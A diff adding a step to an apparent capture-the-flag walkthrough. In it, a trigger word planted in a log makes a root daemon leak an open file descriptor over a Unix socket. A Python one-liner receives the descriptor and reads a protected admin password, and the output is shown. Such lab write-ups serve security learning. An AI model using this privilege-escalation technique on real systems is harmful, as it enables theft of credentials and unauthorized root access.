@@ -879,6 +879,73 @@ else: conn.sendall(SHA256("SYSTEM_CLEAN:"+secret)) # only a hash
 - Reading that descriptor yields the admin password without any read permission on the file itself.
 
 **Next:** Plant the trigger, connect to `mgmt.sock`, receive the leaked descriptor, and read the admin password.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+#### 5.3 Leak root's file descriptor and recover the admin password
+
+**Why this step:** The daemon leaks root's open descriptor for `admin_pins.conf` when its log contains a trigger word. Planting the trigger and receiving the descriptor yields the protected password.
+
+**Command (on target, as `archivist`):**
+
+```bash
+mkdir -p /home/archivist/printer/logs
+echo "FSQUERY" > /home/archivist/printer/logs/commands.log
+python3 -c '
+import socket, array, os
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(8))
+print("msg:", msg.decode(errors="ignore"))
+for level, typ, data in anc:
+    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
+        fds = array.array("i"); fds.frombytes(data)
+        for fd in fds:
+            try:
+                print(f"[fd {fd}]", os.pread(fd, 1024, 0).decode(errors="ignore").strip())
+            except Exception as e:
+                print(f"[fd {fd}] read error: {e}")
+s.close()
+'
+```
+
+**Breakdown:**
+
+- `echo "FSQUERY" > .../commands.log`: plant a trigger word so `scan_for_malice()` returns true and the daemon takes the leaking branch.
+- `socket.AF_UNIX ... connect("/run/paperwork/mgmt.sock")`: connect to the root daemon's socket.
+- `recvmsg(4096, socket.CMSG_SPACE(8))`: receive the message plus ancillary data sized for two passed descriptors.
+- `SCM_RIGHTS` loop with `array("i")`: parse the ancillary data into descriptor numbers mapped into this process.
+- `os.pread(fd, 1024, 0)`: read each leaked descriptor directly, bypassing file permissions.
+
+**Result:**
+
+```
+msg: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+[fd 4] FSQUERY
+[fd 5] ADMIN_PASSWORD=ApparelMortuaryCedar22
+```
+
+**What this gives you:**
+
+- Key finding: forcing the lockdown branch leaks root's open descriptor on `/etc/paperwork/admin_pins.conf`, yielding `ADMIN_PASSWORD=ApparelMortuaryCedar22` with no read permission on the file.
+- `fd 4` is the attacker-controlled log; `fd 5` is the privileged secret.
+
+**Next:** Reuse the recovered password to switch to root and read `root.txt`.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
 
 <div align="center">
 <br>
